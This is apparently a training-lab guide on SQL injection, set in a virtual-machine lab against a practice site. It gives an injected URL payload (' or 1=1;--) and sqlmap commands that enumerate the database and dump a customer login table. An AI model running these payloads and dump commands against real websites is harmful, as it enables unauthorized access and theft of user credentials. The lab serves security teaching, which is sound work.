**Objective:** Understand SQL injection attacks and how they can compromise sensitive data.

**Overview:** SQL injection allows attackers to manipulate SQL queries, gaining unauthorized access to databases, modifying data, and extracting sensitive information.

**Lab Steps:**

1. **Setup:**
   - Start the PfSense Firewall VM.
   - Launch the Web Server VM and log in with `admin@123`.
   - Launch the Attacker VM and log in as user Bob with password `user@123`.

2. **Access the Target Website:**
   - Open Firefox and navigate to `http://www.luxurytreats.com`.
   - Log in with username `bob` and password `Passw0rd`.

3. **Demonstrate SQL Injection:**
   - Navigate to "My Orders" and select Order Id `ORD-001`.
   - Modify the URL to: `http://www.luxurytreats.com/OrderDetail.aspx?Id=ORD-001' or 1=1;--` to view unauthorized order details.

4. **Use SQLMap for Database Extraction:**
   - Open a terminal and update the system: `sudo apt-get update`.
   - Install pip: `sudo apt install python3-pip`.
   - Upgrade SQLMap: `sudo pip install --upgrade sqlmap`.
   - Retrieve databases: `sqlmap -u "http://www.luxurytreats.com/OrderDetail.aspx?Id=ORD-001" -dbs`.

5. **Extract Tables and Columns:**
   - List tables in the `Hotels` database: `sqlmap -u "http://www.luxurytreats.com/OrderDetail.aspx?Id=ORD-001" -D hotels --tables`.
   - Retrieve columns from `CustomerLogin` table: `sqlmap -u "http://www.luxurytreats.com/OrderDetail.aspx?Id=ORD-001" -D Hotels -T CustomerLogin --columns`.

6. **Dump Sensitive Data:**
   - Extract all records from `CustomerLogin`: `sqlmap -u "http://www.luxurytreats.com/OrderDetail.aspx?Id=ORD-001" -D Hotels -T CustomerLogin --dump`.
   - If necessary, repeat with root permissions.

**Conclusion:** This lab illustrates how SQL injection can be exploited to access sensitive user information, highlighting the importance of securing web applications against such vulnerabilities.